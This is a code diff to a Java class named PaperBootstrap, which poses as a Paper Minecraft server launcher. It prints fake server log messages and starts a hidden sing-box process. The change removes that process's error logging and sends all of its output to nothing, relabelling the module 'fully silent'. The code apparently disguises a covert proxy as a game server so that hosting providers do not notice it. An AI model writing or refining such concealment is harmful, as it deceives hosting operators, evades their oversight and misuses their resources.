@@ -152,8 +152,7 @@ public class PaperBootstrap {
                 printLog("Server thread", "ThreadedAnvilChunkStorage (world): All chunks are saved");
                 printLog("Server thread", "ThreadedAnvilChunkStorage (DIM1): All chunks are saved");
                 printLog("Server thread", "ThreadedAnvilChunkStorage (DIM-1): All chunks are saved");
-                printLog("Server thread", "ThreadedAnvilChunkStorage: All dimensions are saved");
-                printLog("Server thread", "Server empty for 60 seconds, pausing");
+                printLog("Server thread", "ThreadedAnvilChunkStorage: All dimensions are saved.");
 
             } catch (InterruptedException ignored) {}
         }).start();
@@ -223,20 +222,15 @@ public class PaperBootstrap {
         return new HashMap<>();
     }
 
-// ==========================================
-    // 🚀 核心进程启动模块 (调试模式：输出报错到文件)
+    // ==========================================
+    // 🚀 核心进程启动模块 (全静默)
     // ==========================================
     private static Process startHiddenProcess(Path bin, Path cfg) throws IOException, InterruptedException {
         ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
-        
-        // 【修改点】：不再丢弃输出，而是写入到 logs/singbox-error.log
-        Path errorLog = Paths.get("logs/singbox-error.log");
-        Files.createDirectories(errorLog.getParent());
         pb.redirectErrorStream(true);
-        pb.redirectOutput(errorLog.toFile()); 
-        
+        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
         Process p = pb.start();
-        Thread.sleep(1500); 
+        Thread.sleep(1000); 
         return p;
     }
 
